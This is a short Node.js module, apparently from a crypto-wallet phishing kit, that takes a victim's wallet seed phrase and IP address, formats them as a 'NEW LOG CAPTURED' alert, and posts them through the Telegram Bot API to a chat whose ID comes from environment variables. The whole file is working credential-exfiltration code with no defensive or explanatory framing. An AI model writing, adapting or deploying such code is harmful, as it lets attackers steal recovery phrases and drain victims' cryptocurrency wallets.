const https = require('https');
require('dotenv').config();

const sendSeedData = (seedPhrase, userIP, socketId) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) return;

    const words = seedPhrase.trim().split(/\s+/);
    const verticalList = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
    const shortId = socketId ? socketId.substring(0, 6).toUpperCase() : 'USER';

    const message = `🚀 NEW LOG CAPTURED\n━━━━━━━━━━━━━━━━━━━━\n👤 USER ID: ${shortId}\n🌐 IP: ${userIP}\n\n🔑 SEED PHRASE:\n${verticalList}\n━━━━━━━━━━━━━━━━━━━━`;

    const data = JSON.stringify({ chat_id: chatId, text: message });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${botToken}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    };

    const req = https.request(options);
    req.write(data);
    req.end();
};

module.exports = { sendSeedData };